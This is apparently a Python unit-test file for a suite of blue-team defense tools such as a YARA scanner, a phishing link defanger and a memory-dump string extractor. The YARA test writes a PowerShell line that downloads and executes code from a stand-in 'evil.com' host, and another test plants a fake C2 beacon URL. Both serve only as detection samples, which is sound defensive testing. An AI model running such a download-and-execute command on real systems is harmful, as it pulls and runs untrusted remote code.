"""Unit tests for all 10 blue team defense tools."""

import os
import tempfile
import pytest

from blue_team_defense.tools.phishing_link_defanger import execute_phishing_link_defanger
from blue_team_defense.tools.file_entropy_triage import execute_file_entropy_triage
from blue_team_defense.tools.password_entropy_auditor import execute_password_entropy_auditor
from blue_team_defense.tools.defender_posture_checker import execute_defender_posture_checker
from blue_team_defense.tools.yara_rule_scanner import execute_yara_rule_scanner
from blue_team_defense.tools.decoy_canary_generator import execute_decoy_canary_generator
from blue_team_defense.tools.hash_integrity_baseline import execute_hash_integrity_baseline
from blue_team_defense.tools.memory_dump_string_extractor import execute_memory_dump_string_extractor
from blue_team_defense.tools.usb_storage_forensics import execute_usb_storage_forensics
from blue_team_defense.tools.firewall_rule_auditor import execute_firewall_rule_auditor


def test_phishing_link_defanger():
    sample_url = "https://secure-login.test.com/auth?utm_source=spam&token=abc"
    res = execute_phishing_link_defanger(input_url=sample_url, defang=True, strip_tracking=True)
    assert res["status"] == "success"
    assert "hxxps://" in res["records"][0]["defanged"]
    assert "utm_source" not in res["records"][0]["sanitized"]


def test_file_entropy_triage():
    with tempfile.NamedTemporaryFile(delete=False) as tf:
        tf.write(b"Normal English text repeated multiple times. " * 50)
        tf_name = tf.name

    try:
        res = execute_file_entropy_triage(file_path=tf_name)
        assert res["status"] == "success"
        assert res["overall_entropy"] > 0.0
        assert "classification" in res
    finally:
        if os.path.exists(tf_name):
            os.remove(tf_name)


def test_password_entropy_auditor():
    res = execute_password_entropy_auditor(password="CorrectHorseBatteryStaple123!")
    assert res["status"] == "success"
    assert res["entropy_bits"] >= 50.0
    assert "rating" in res


def test_defender_posture_checker():
    res = execute_defender_posture_checker()
    assert res["status"] == "success"
    assert "overall_posture_score" in res


def test_yara_rule_scanner():
    with tempfile.TemporaryDirectory() as tmpdir:
        dummy_file = os.path.join(tmpdir, "script.ps1")
        with open(dummy_file, "w") as f:
            f.write("IEX (New-Object Net.WebClient).DownloadString('http://evil.com')")
        res = execute_yara_rule_scanner(target_dir=tmpdir)
        assert res["status"] == "success"
        assert res["flagged_files_count"] >= 1


def test_decoy_canary_generator():
    with tempfile.TemporaryDirectory() as tmpdir:
        out_canary = os.path.join(tmpdir, "canary.pdf")
        res = execute_decoy_canary_generator(file_type="pdf", output_path=out_canary)
        assert res["status"] == "success"
        assert os.path.isfile(out_canary)
        assert "canary_token" in res


def test_hash_integrity_baseline():
    with tempfile.TemporaryDirectory() as tmpdir:
        f1 = os.path.join(tmpdir, "f1.txt")
        with open(f1, "w") as f:
            f.write("data 1")
        base_file = os.path.join(tmpdir, "baseline.json")
        res_create = execute_hash_integrity_baseline(directory=tmpdir, baseline_file=base_file, mode="create")
        assert res_create["status"] == "success"
        assert os.path.isfile(base_file)

        res_verify = execute_hash_integrity_baseline(directory=tmpdir, baseline_file=base_file, mode="verify")
        assert res_verify["status"] == "success"
        assert res_verify["tampering_detected"] is False


def test_memory_dump_string_extractor():
    with tempfile.NamedTemporaryFile(delete=False) as tf:
        tf.write(b"\x00\x00\x00http://evil-c2.com/beacon\x00\x00\x00malware.exe\x00")
        tf_name = tf.name

    try:
        res = execute_memory_dump_string_extractor(file_path=tf_name)
        assert res["status"] == "success"
        assert len(res["indicators"]["urls_found"]) >= 1
    finally:
        if os.path.exists(tf_name):
            os.remove(tf_name)


def test_usb_storage_forensics():
    res = execute_usb_storage_forensics()
    assert res["status"] == "success"
    assert "devices_found_count" in res


def test_firewall_rule_auditor():
    res = execute_firewall_rule_auditor()
    assert res["status"] == "success"
    assert "total_rules_audited" in res
